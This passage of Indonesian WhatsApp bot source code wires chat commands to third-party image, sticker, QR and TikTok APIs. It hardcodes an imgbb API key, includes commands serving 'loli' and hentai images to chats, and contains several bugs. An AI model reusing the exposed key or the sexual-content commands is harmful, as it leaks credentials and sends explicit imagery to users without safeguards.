if (args.length < 1) return reply(`Gini, ${prefix}shortlink https://youtu.be/v0ej6EJGqos`)
linkhm = body.slice(11)
ano = await fetchJson(`https://spybot-api.herokuapp.com/api/short/tiny?url=${linkhm}&apikey=${spykey}`)
tekss = `*🗣️SHORTLINK🗣️*\n_☠️Versi : 1.12_\n\n☠️Link lu : ${linkhm}\n☠️Hasil : ${ano.result.link}\n\n_☠️TERIMA KASIH TELAH MENGGUNAKAN BOT☠️_`
yusufz.sendMessage(from, tekss, text, {quoted: mek1})
break
case 'neontext':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} YusufZ`)
teksdia = body.slice(10)
ano = await fetchJson(`https://spybot-api.herokuapp.com/api/textmaker/metallic?text=${teksdia}&theme=neon&apikey=${spykey}`)
ini_buff = await getBuffer(`${ano.result.link}`, {method: 'get'})
tekss = `*☠️${namabot}☠️*`
yusufz.sendMessage(from, ini_buff, image, {quoted: mek1, caption: tekss})
break
case 'art-quote':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} jamed`)
punyadia = body.slice(11)
anuh = await fetchJson(`https://spybot-api.herokuapp.com/api/textmaker/random?text=${punyadia}&theme=art-quote&apikey=${spykey}`)
luwibuu = await getBuffer(`${anuh.result.url}`, {method: 'get'})
tekss = `☠️${namabot}☠️`
yusufz.sendMessage(from, luwibuu, image, {quoted: mek1, caption: tekss})
break
case 'summer':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} ilham`)
teksny = body.slice(8)
anu = await fetchJson(`https://spybot-api.herokuapp.com/api/textmaker/alam?text=${teksny}&theme=summer&apikey=${spykey}`)
oau = await getBuffer(`${anu.result.url}`, {method: 'get'})
tekss = `☠️${namabot}☠️`
yusufz.sendMessage(from, oau, image, {quoted: mek1, caption: tekss})
break
/***********OTHERS*********/
case 'encode':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix}encode yourscript`)
itteks = body.slice(8)
anu = await fetchJson(`https://spybot-api.herokuapp.com/api/base?apikey=${spykey}&type=base64&encode=${itteks}`)
tekss = `*☠️Encode☠️*\n\n✍️Strings : ${itteks}\n✍️Hasil : ${anu.result.encode}`
yusufz.sendMessage(from, tekss, text, {quoted: mek1})
break
case 'decode':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix}decode yourscript`)
iteks = body.slice(8)
anu = await fetchJson(`https://spybot-api.herokuapp.com/api/base?apikey=${spykey}&type=base64&decode=${iteks}`)
tekss = `*☠️Decode☠️*\n\n✍️Encript : ${anu.result.enc}\n✍️Hasil : ${anu.result.string}`
yusufz.sendMessage(from, tekss, text, {quoted: mek1})
break
case 'setprefix':
					if (args.length < 1) return
					if (!isOwner) return reply(`Khusus Owner`)
					prefix = args[0]
					reply(`*Prefix berhasil di ubah menjadi* : ${prefix}`)
					break 
		    case 'admin':
            case 'owner':
            case 'creator':
            case 'developer':
                  yusufz.sendMessage(from, {displayname: "YSF", vcard: vcard}, MessageType.contact, { quoted: mek1})
                  yusufz.sendMessage(from, 'Tuh nomor ownernya ',MessageType.text, { quoted: mek} )
					break
					case 'leave':
					if (!isGroup) return reply(`Khusus Grup`)
					if (!isPrem) return reply(`Khusus Premium Ngab, Kalo Owner ${prefix}ownleave`)
					setTimeout( () => {
					yusufz.groupLeave (from) 
					}, 2000)
					setTimeout( () => {
					yusufz.updatePresence(from, Presence.composing) 
					yusufz.sendMessage(from, 'Bye cuk🗣', text) // ur cods
					}, 0)
					break
case 'leave':
					if (!isGroup) return reply(`Khusus Grup`)
					if (!isOwner) return reply(`Khusus Owner ngab, kalo Premium ${prefix}leave`)
					setTimeout( () => {
					yusufz.groupLeave (from) 
					}, 2000)
					setTimeout( () => {
					yusufz.updatePresence(from, Presence.composing) 
					yusufz.sendMessage(from, 'Bye cuk🗣', text) // ur cods
					}, 0)
					break
case 'addprem':
				if (!isOwner) return reply(`Khusus _Owner~_`)
				premm = body.slice(9)
				prem.push(`${premm}@s.whatsapp.net`)
				fs.writeFileSync('./src/premium.json', JSON.stringify(prem))
				reply(`@${premm} Telah Menjadi Premium!`)
				break
case 'dellprem':
				if (!isOwner) return reply(`Khusus Owner!!!!!`)
				premm = body.slice(10)
				prem.splice(`${premm}@s.whatsapp.net`, 1)
				fs.writeFileSync('./src/premium.json', JSON.stringify(prem))
				reply(`@${premm} Premium anda telah berakhir! `)
				break
case 'ban':
				if (!isOwner) return reply(`Khusus Ownerr!!`)
				bnnd = body.slice(5)
				ban.push(`${bnnd}@s.whatsapp.net`)
				fs.writeFileSync('./src/banned.json', JSON.stringify(ban))
				reply(`Berhasil membanned @${bnnd} `)
				break
		case 'unban':
				if (!isOwner) return reply(`Khusus Owner!!`)
				bnnd = body.slice(7)
				ban.splice(`${bnnd}@s.whatsapp.net`, 1)
				fs.writeFileSync('./src/banned.json', JSON.stringify(ban))
				reply(`@${bnnd} telah di unban!`)
				break
case 'speed':
		case 'ping':
					if (isBanned) return reply(mess.only.benned)
					await yusufz.sendMessage(from, `Pong!!!!\nSpeed: ${processTime(time, moment())} _Second_`)
					break
case 'ttp':
        if (isBanned) return reply(mess.only.benned)
                     if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} ngontol`)
	                reply(`Wait Bree`)
                    query = `${body.slice(5)}`
                    reply(`Berhasil membuat!`)
                    anu = await getBuffer(`https://api.lolhuman.xyz/api/ttp?apikey=${lolkey}&text=${query}`)
                    yusufz.sendMessage(from, anu, sticker)
                    break
case 'ttp1':
        if (isBanned) return reply(mess.only.benned)
                     if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} Kontul`)
	                reply(`Wait Bree`)
                    query = `${body.slice(6)}`
                    reply(`Berhasil membuat!`)
                    anu = await getBuffer(`https://api.lolhuman.xyz/api/ttp2?apikey=${lolkey}&text=${query}`)
                    yusufz.sendMessage(from, anu, sticker)
                    break
case 'ttp2':
        if (isBanned) return reply(mess.only.benned)
                     if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} Hafiz`)
	                reply(`Wait Bree`)
                    query = `${body.slice(6)}`
                    reply(`Berhasil membuat!`)
                    anu = await getBuffer(`https://api.lolhuman.xyz/api/ttp3?apikey=${lolkey}&text=${query}`)
                    yusufz.sendMessage(from, anu, sticker)
                    break
case 'ttp3':
        if (isBanned) return reply(mess.only.benned)
                     if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} ibnu`)
	                reply(`Wait Bree`)
                    query = `${body.slice(6)}`
                    reply(`Berhasil membuat!`)
                    anu = await getBuffer(`https://api.lolhuman.xyz/api/ttp4?apikey=${lolkey}&text=${query}`)
                    yusufz.sendMessage(from, anu, sticker)
                    break
case 'attp':
        if (isBanned) return reply(mess.only.benned)
                     if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} bilkaf`)
	                reply(`Wait Bree`)
                    query = `${body.slice(6)}`
                    reply(`Berhasil membuat!`)
                    anu = await getBuffer(`https://api.lolhuman.xyz/api/attp?apikey=${lolkey}&text=${query}`)
                    yusufz.sendMessage(from, anu, sticker)
                    break
case 'attp1':
        if (isBanned) return reply(mess.only.benned)
                     if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} nubi`)
	                reply(`Wait Bree`)
                    query = `${body.slice(7)}`
                    reply(`Berhasil membuat!`)
                    anu = await getBuffer(`https://api.lolhuman.xyz/api/attp2?apikey=${lolkey}&text=${query}`)
                    yusufz.sendMessage(from, anu, sticker)
                    break
case 'nulis':
        if (isBanned) return reply(mess.only.benned)
                     if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} Nida`)
	                reply(`Wait Bree`)
                    quyy = `${body.slice(7)}`
                    reply(`Berhasil membuat!`)
                    ano = await getBuffer(`https://api.lolhuman.xyz/api/nulis?apikey=${lolkey}&text=${quyy}`, {method: 'get'})
                    tekss = `_☠️${namabot}☠️_`
                    yusufz.sendMessage(from, ano, image, {quoted: mek1, caption: tekss})
                    break
case 'tahta':
        if (isBanned) return reply(mess.only.benned)
                     if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} zboyz`)
	                reply(`Wait Bree`)
                    ysfz = `${body.slice(7)}`
                    reply(`Berhasil membuat!`)
                    aingn = await getBuffer(`https://api.lolhuman.xyz/api/hartatahta?apikey=${lolkey}&text=${ysfz}`, {method: 'get'})
                    tekss = `_☠️${namabot}☠️_`
                    yusufz.sendMessage(from, aingn, image, {quoted: mek1, caption: tekss})
                    break
case 'kodeqrmaker':
        if (isBanned) return reply(mess.only.benned)
                     if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} ilham`)
	                reply(`Wait Bree`)
                    ysfz = `${body.slice(13)}`
                    reply(`Berhasil membuat!`)
                    anah = await getBuffer(`https://api.lolhuman.xyz/api/qrcode?apikey=${lolkey}&text=${ysfz}`, {method: 'get'})
                    tekss = `Jangan lupa suruh temen scan kode qrnya, dan liat rincian qrnya, pasti berhasil`
                    yusufz.sendMessage(from, anah, image, {quoted: mek1, caption: tekss})
                    break
case 'infokodeqr':
        if (isBanned) return reply(mess.only.benned)
var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(`Wait Bang`)
	  owgi = await yusufz.downloadAndSaveMediaMessage(ted)
	  anu = await imgbb("6cc42a6d77db20412c6ecb304dc4dc31", owgi)
                    ano = await fetchJson(`https://api.lolhuman.xyz/api/read-qr?apikey=${lolkey}&img=${anu.display_url}`)
                    tekss = `☠️Rincian Kode QR☠️\nHasil : ${ano.result}\n\n☠️${namabot}☠️`
                    yusufz.sendMessage(from, tekss, text, {quoted: mek1})
                    } else {
	  reply(`Kirim foto dengan caption ${prefix + command}`)
	}
	break
case 'setname':
					if (!isGroup) return reply(`Khusus Grup:)`)
					if (!isGroupAdmins) return reply(`Khusus Admin Grup Ngab!`)
					if (!isBotGroupAdmins) return reply(`Bot Harus Menjadi Admin!!`)
					yusufz.groupUpdateSubject(from, `${body.slice(9)}`)
					yusufz.sendMessage(from, 'Succes, Ganti Nama Grup', text, {quoted: mek1})
					break
                case 'setdesc':
					if (!isGroup) return reply(`Khusus Grup:)`)
					if (!isGroupAdmins) return reply(`Khusus Admin Grup Ngab!`)
					if (!isBotGroupAdmins) return reply(`Bot Harus Menjadi Admin!!`)
					yusufz.groupUpdateDescription(from, `${body.slice(9)}`)
					yusufz.sendMessage(from, 'Succes, Ganti Deskripsi Grup', text, {quoted: mek1})
					break
case 'shutdown':

             if (!isOwner) return reply(`🗿`)
             reply(`Bye...`)

             process.exit()

             break
case 'tes':
reply(`Nyala Bwang:v`)
break
case 'donasi':
case 'donate':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `Hai ${pushname} 👋\nMau Donasi Via apa?`
but = [
          { buttonId: `${prefix}viadana`, buttonText: { displayText: '☠️DANA' }, type: 1 },
          { buttonId: `${prefix}viagopay`, buttonText: { displayText: '☠️GOPAY' }, type: 1 },
          { buttonId: `${prefix}viapulsa`, buttonText: { displayText: '☠️PULSA' }, type: 1 }
        ]
        sendButImage(from, manu, trans, buff, but)
break
case 'viadana':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `Hai ${pushname} 👋\n✍️Dana : ${nodana}`
but = [
          { buttonId: `${prefix}sewabot`, buttonText: { displayText: '✍️ SEWA BOT' }, type: 1 }
        ]
        sendButImage(from, manu, trans, buff, but)
        break
case 'viagopay':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `Hai ${pushname} 👋\n✍️Gopay : ${nogopay}`
but = [
          { buttonId: `${prefix}sewabot`, buttonText: { displayText: '✍️ SEWA BOT' }, type: 1 }
        ]
        sendButImage(from, manu, trans, buff, but)
        break
case 'viapulsa':
buff = fs.readFileSync(`${thumb}`)
          trans = `${footertext}!`
manu = `Hai ${pushname} 👋\n✍Pulsa : ️${nopulsa}`
but = [
          { buttonId: `${prefix}sewabot`, buttonText: { displayText: '✍️ SEWA BOT' }, type: 1 }
        ]
        sendButImage(from, manu, trans, buff, but)
        break
case 'stickpatrick':
case 'stickerpatrick':
case 'stikerpetrik':
case 'stikerpatrik':
if (isBanned) return reply(mess.only.benned)
reply(`✍️sedang membuat`)
ano = await getBuffer(`https://api.lolhuman.xyz/api/sticker/patrick?apikey=${lolkey}`, {method: 'get'})
reply(`✔️Berhasil!`)
yusufz.sendMessage(from, ano, sticker, {quoted: mek1})
break
case 'stickdadu':
case 'dadu':
case 'stikerdadu':
case 'stickerdadu':
if (isBanned) return reply(mess.only.benned)
reply(`✍️sedang membuat`)
ano = await getBuffer(`https://api.lolhuman.xyz/api/sticker/dadu?apikey=${lolkey}`, {method: 'get'})
reply(`✓berhasil!`)
yusufz.sendMessage(from, ano, sticker, {quoted: mek1})
break
case 'loli':
if (isBanned) return reply(mess.only.benned)
reply(`✍️sedang mencari`)
ano = await getBuffer(`https://api.lolhuman.xyz/api/random/loli?apikey=${lolkey}`, {method: 'get'})
reply(`✔️berhasil`)
wmny = `_☠️${namabot}☠️_`
trans = `${footertext}!`
but = [
          { buttonId: `${prefix}loli`, buttonText: { displayText: '👉LANJUT' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 }
        ]
        sendButImage(from, wmny, trans, ano, but)
break
case 'simi':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix}simi halo simi`)
ktak = body.slice(6)
ano = await fetchJson(`https://api.lolhuman.xyz/api/simi?apikey=${lolkey}&text=${ktak}`)
simaa = `${ano.result}`
yusufz.sendMessage(from, simaa, text, {quoted: fak3})
break
case 'marvelmaker':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix}marvelmaker Spy|Bot`)
if (!q.includes('|')) return  reply(`Format Salah\nContoh : ${prefix + command} Spy|Bot`)
reply(`Sedang membaca format!`)
                			const namakiri = q.substring(0, q.indexOf('|') - 0)
                			const namakanan = q.substring(q.lastIndexOf('|') + 1)
reply(`berhasil!`)
ano = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/marvelstudio?apikey=${lolkey}&text1=${namakiri}&text2=${namakanan}`, {method: 'get'})
tekss = `☠️${namabot}☠️`
yusufz.sendMessage(from, ano, image, {quoted: mek1, caption: tekss})
break
case 'pornhub':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} Spy|Bot`)
if (!q.includes('|')) return  reply(`Format Salah\nContoh : ${prefix + command} Spy|Bot`)
reply(`Sedang membaca format!`)
                			const namakiri1 = q.substring(0, q.indexOf('|') - 0)
                			const namakanan1 = q.substring(q.lastIndexOf('|') + 1)
reply(`berhasil!`)
ano = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/pornhub?apikey=${lolkey}&text1=${namakiri1}&text2=${namakanan1}`, {method: 'get'})
tekss = `☠️${namabot}☠️`
yusufz.sendMessage(from, ano, image, {quoted: mek1, caption: tekss})
break
case 'avenger':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} Spy|Bot`)
if (!q.includes('|')) return  reply(`Format Salah\nContoh : ${prefix + command} Spy|Bot`)
reply(`Sedang membaca format!`)
                			const namakiri2 = q.substring(0, q.indexOf('|') - 0)
                			const namakanan2 = q.substring(q.lastIndexOf('|') + 1)
reply(`berhasil!`)
ano = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/avenger?apikey=${lolkey}&text1=${namakiri2}&text2=${namakanan2}`, {method: 'get'})
tekss = `☠️${namabot}☠️`
yusufz.sendMessage(from, ano, image, {quoted: mek1, caption: tekss})
break
case 'ninjalogo':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} Spy|Bot`)
if (!q.includes('|')) return  reply(`Format Salah\nContoh : ${prefix + command} Spy|Bot`)
reply(`Sedang membaca format!`)
                			const namakiri3 = q.substring(0, q.indexOf('|') - 0)
                			const namakanan3 = q.substring(q.lastIndexOf('|') + 1)
reply(`berhasil!`)
ano = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/ninjalogo?apikey=${lolkey}&text1=${namakiri3}&text2=${namakanan3}`, {method: 'get'})
tekss = `☠️${namabot}☠️`
yusufz.sendMessage(from, ano, image, {quoted: mek1, caption: tekss})
break

case 'amongus':
if (isBanned) return reply(mess.only.benned)
ano = await getBuffer(`https://api.lolhuman.xyz/api/sticker/amongus?apikey=${lolkey}`, {method: 'get'})
yusufz.sendMessage(from, ano, sticker, {quoted: mek1})
break
case 'gawrgura':
if (isBanned) return reply(mess.only.benned)
ano = await getBuffer(`https://api.lolhuman.xyz/api/sticker/gawrgura?apikey=${lolkey}`, {method: 'get'})
yusufz.sendMessage(from, ano, sticker, {quoted: mek1})
break
case 'dog':
case 'anjing':
case 'stickdog':
if (isBanned) return reply(mess.only.benned)
ano = await getBuffer(`https://api.lolhuman.xyz/api/sticker/anjing?apikey=${lolkey}`, {method: 'get'})
yusufz.sendMessage(from, ano, sticker, {quoted: mek1})
break
// seru seru an:v
case 'verifikasinomor':
if (isBanned) return reply(mess.only.benned)

              const serialn =['7CHA91NAHI','818NAJAH910','910KN10','SU74MND1','279nUoV','01NNAK6','017NAJHQ','KAIAHS19','KAJ190J','280NAJ0','017njaYN','19aj09NaA','AS3P29','KWHJUAB9','0172NJSJH','1282NAKANAJ','2927snIjalP','0279vakHIl','9169BAGONV','YH0177B','YSFKSY91','sUH927J']

              const die = serialn[Math.floor(Math.random() * serialn.length)]

              yusufz.sendMessage(from, '*☠️Terimakasih Telah Mendaftar☠️\n- Serial : * '+die+'\n\nStay in My Bot Ok!', text, { quoted: mek1 })

              break
// waifu 
case 'waifu':
if (isBanned) return reply(mess.only.benned)
ano = await getBuffer(`https://api.lolhuman.xyz/api/random/waifu?apikey=${lolkey}`, {method: 'get'})
tekss = `Ingat!, Cintai Waifu`
trans = `${footertext}!`
but = [
          { buttonId: `${prefix}waifu`, buttonText: { displayText: '👉LANJUT' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 }
        ]
        sendButImage(from, tekss, trans, ano, but)
break
case 'nsfwhentaigif':
if (isBanned) return reply(mess.only.benned)
if (!isPrem) return reply(`Khusus Premium!`)
ano = await getBuffer(`https://api.lolhuman.xyz/api/random2/random_hentai_gif?apikey=${lolkey}`, {method: 'get'})
yusufz.sendMessage(from, ano, sticker, {quoted: mek1})
break
// random
case 'quotesimage':
if (isBanned) return reply(mess.only.benned)
ano = await getBuffer(`https://api.lolhuman.xyz/api/random/quotesimage?apikey=${lolkey}`, {method: 'get'})
tekss = `☠️${namabot}☠️`
trans = `${footertext}!`
but = [
          { buttonId: `${prefix}quotesimage`, buttonText: { displayText: '👉LANJUT' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 }
        ]
        sendButImage(from, tekss, trans, buff, but)
break
// maker lagi:(
// capek anj
case 'blackpink':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} SpyBot`)
capekbnr = body.slice(11)
ano = await getBuffer(`https://api.lolhuman.xyz/api/textprome/blackpink?apikey=${lolkey}&text=${capekbnr}`, {method: 'get'})
tekss = `☠️${namabot}☠️`
yusufz.sendMessage(from, ano, image, {quoted: mek1, caption: tekss})
break
//ke 61
case 'greenneon':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} SpyBot`)
wkcpe = body.slice(11)
ano = await getBuffer(`https://api.lolhuman.xyz/api/textprome/greenneon?apikey=${lolkey}&text=${wkcpe}`, {method: 'get'})
tekss = `☠️${namabot}☠️`
yusufz.sendMessage(from, ano, image, {quoted: mek1, caption: tekss})
break
//ke 62
case 'futureneon':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} SpyBot`)
woilh = body.slice(12)
ano = await getBuffer(`https://api.lolhuman.xyz/api/textprome/futureneon?apikey=${lolkey}&text=${woylh}`, {method: 'get'})
tekss = `☠️${namabot}☠️`
yusufz.sendMessage(from, ano, image, {quoted: mek1, caption: tekss})
break
// ke 63
case 'sandwriting':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} SpyBot`)
hweh = body.slice(13)
ano = await getBuffer(`https://api.lolhuman.xyz/api/textprome/sandwriting?apikey=${lolkey}&text=${hweh}`, {method: 'get'})
tekss = `☠️${namabot}☠️`
yusufz.sendMessage(from, ano, image, {quoted: mek1, caption: tekss})
break
// ke 64 
case 'randomanime':
if (isBanned) return reply(mess.only.benned)
ano = await fetchJson(`https://api.lolhuman.xyz/api/storynime?apikey=${lolkey}`)
buff = await getBuffer(`${ano.result}`, {method: 'get'})
tekss = `☠️${namabot}☠️`
yusufz.sendMessage(from, buff, video, {quoted: mek1, caption: tekss})
break
// ke 65
// capek sumpah ngefix ini:)
case 'whatanime':
if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(`Wait Bang`)
	  owgi = await yusufz.downloadAndSaveMediaMessage(ted)
	  anu = await imgbb("6cc42a6d77db20412c6ecb304dc4dc31", owgi)
	  hehe = await fetchJson(`https://api.lolhuman.xyz/api/wait?apikey=${lolkey}&img=${anu.display_url}`)
	 pmdhn = await getBuffer(`${hehe.result.video}`, {method: 'get'})
    tekss = `Judul : ${hehe.result.title_romaji}\n${hehe.result.title_native}\nEps : ${hehe.result.episode}`
    yusufz.sendMessage(from, pmdhn, video, {quoted: mek1, caption: tekss})
	} else {
	  reply(`Kirim foto dengan caption ${prefix + command}`)
	}
	break
// ke 66
case 'triggered':
case 'triggeredmaker':
case 'marahmaker':
if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(`Wait Bang`)
	  owgi = await yusufz.downloadAndSaveMediaMessage(ted)
	  anu = await imgbb("6cc42a6d77db20412c6ecb304dc4dc31", owgi)
	  baff = await getBuffer(`https://api.lolhuman.xyz/api/creator1/trigger?apikey=${lolkey}&img=${anu.display_url}`, {method: 'get'})
	yusufz.sendMessage(from, baff, video, {quoted: mek1})
	} else {
	  reply(`Kirim foto dengan caption ${prefix + command}`)
	}
	break
// ke 67
case 'removebg':
case 'rmbg':
case 'hapusbackground':
if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(`Wait Bang`)
	  owgi = await yusufz.downloadAndSaveMediaMessage(ted)
	  anu = await imgbb("6cc42a6d77db20412c6ecb304dc4dc31", owgi)
	  mengbuff = await getBuffer(`https://api.lolhuman.xyz/api/removebg?apikey=${lolkey}&img=${anu.display_url}`, {method: 'get'})
	iniwmy = `☠️${namabot}☠️`
	yusufz.sendMessage(from, mengbuff, image, {quoted: mek1, caption: iniwmy})
	} else {
	  reply(`Kirim foto dengan caption ${prefix + command}`)
	}
	break
// ke 68
case 'ripmaker':
if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(`Wait Bang`)
	  owgi = await yusufz.downloadAndSaveMediaMessage(ted)
	  anu = await imgbb("6cc42a6d77db20412c6ecb304dc4dc31", owgi)
	h3h3 = await getBuffer(`https://api.lolhuman.xyz/api/creator1/rip?apikey=${lolkey}&img=${anu.display_url}`, {method: 'get'})
	iniwmy = `☠️${namabot}☠️`
	yusufz.sendMessage(from, h3h3, image, {quoted: mek1, caption: iniwmy})
	} else {
	  reply(`Kirim foto dengan caption ${prefix + command}`)
	}
	break
// ke 69
case 'wanted':
if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(`Wait Bang`)
	  owgi = await yusufz.downloadAndSaveMediaMessage(ted)
	  anu = await imgbb("6cc42a6d77db20412c6ecb304dc4dc31", owgi)
	  mengbuff = await getBuffer(`https://api.lolhuman.xyz/api/creator1/wanted?apikey=${lolkey}&img=${anu.display_url}`, {method: 'get'})
	iniwmy = `☠️${namabot}☠️`
	yusufz.sendMessage(from, mengbuff, image, {quoted: mek1, caption: iniwmy})
	} else {
	  reply(`Kirim foto dengan caption ${prefix + command}`)
	}
	break
// ke 70
case 'tiktoknowm':
if (isBanned) return reply(mess.only.benned)
if (!isPrem) return reply(`Khusus Premium Ngab`)
if (args.length < 1) return reply(`Gini, ${prefix}tiktoknowm linklu`)
linkdia = body.slice(12)
reply(`Wait Abang ${pushname}`)
bgtu = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=${linkdia}`)
buff = await getBuffer(`${bgtu.result.link}`, {method: 'get'})
iniwm = `☠️${namabot}☠️`
yusufz.sendMessage(from, buff, video, {quoted: mek1, caption: iniwm})
break
// ke 71
case 'kisahnabi':
if (isBanned) return reply(mess.only.benned)
if (args.length < 1) return reply(`Gini, ${prefix + command} Yunus`)
teksnya = body.slice(11)
reply(`Tolong tunggu bang🤗`)
anu = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${teksnya}?apikey=${lolkey}`)
pesanku = `🤗Kisah Nabi🤗\n- Nama : ${anu.result.name}\n- Tahun Kelahiran : ${anu.result.thn_kelahiran}\n- Umur : ${anu.result.age}\n- Tempat : ${anu.result.place}\n\n${anu.result.story}`
yusufz.sendMessage(from, pesanku, text, {quoted: mek1})
break
// ke 72
case 'ceritahoror':
if (isBanned) return reply(mess.only.benned)
anu = await fetchJson(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${lolkey}`)
buff = await getBuffer(`${anu.result.thumbnail}`)
pesanya = `Judul : ${anu.result.title}\nDeskripsi : ${anu.result.desc}\n\nCerita : ${anu.result.story}`
trans = `${footertext}!`
but = [
          { buttonId: `${prefix}ceritahorror`, buttonText: { displayText: '👉LANJUT' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 }
        ]
        sendButImage(from, pesanya, trans, buff, but)
break
// ke 73
case 'burik':
case 'buriq':
case 'pixelate':
if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(`Wait Bang`)
	  owgi = await yusufz.downloadAndSaveMediaMessage(ted)
	  anu = await imgbb("6cc42a6d77db20412c6ecb304dc4dc31", owgi)
	  mengbuff = await getBuffer(`https://api.lolhuman.xyz/api/editor/pixelate?apikey=${lolkey}&img=${anu.display_url}`, {method: 'get'})
	iniwmy = `☠️${namabot}☠️`
	yusufz.sendMessage(from, mengbuff, image, {quoted: mek1, caption: iniwmy})
	} else {
	  reply(`Kirim foto dengan caption ${prefix + command}`)
	}
	break
// ke 74
case 'trash':
case 'tempatsampah':
if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(`Wait Bang`)
	reply(`Tolong Jangan Sara Ya🤗\nKalo Sara Ntar gw ban baru tau rasa:)`)
	  owgi = await yusufz.downloadAndSaveMediaMessage(ted)
	  anu = await imgbb("6cc42a6d77db20412c6ecb304dc4dc31", owgi)
	  mengbuff = await getBuffer(`https://api.lolhuman.xyz/api/creator1/trash?apikey=${lolkey}&img=${anu.display_url}`, {method: 'get'})
	iniwmy = `☠️${namabot}☠️`
	yusufz.sendMessage(from, mengbuff, image, {quoted: mek1, caption: iniwmy})
	} else {
	  reply(`Kirim foto dengan caption ${prefix + command}`)
	}
	break
// ke 75
case 'darkjokes':
if (isBanned) return reply(mess.only.benned)
reply(`Wait bwang...`)
anu = await getBuffer(`https://api.lolhuman.xyz/api/meme/darkjoke?apikey=${lolkey}`, {method: 'get'})
tekss = `Wow Lucu Banget😱`
trans = `${footertext}!`
but = [
          { buttonId: `${prefix}darkjokes`, buttonText: { displayText: '👉LANJUT' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '♞ DONASI' }, type: 1 }
        ]
        sendButImage(from, tekss, trans, buff, but)
break
// ke 76
case 'lacakip':
if (isBanned) return reply(mess.only.benned)
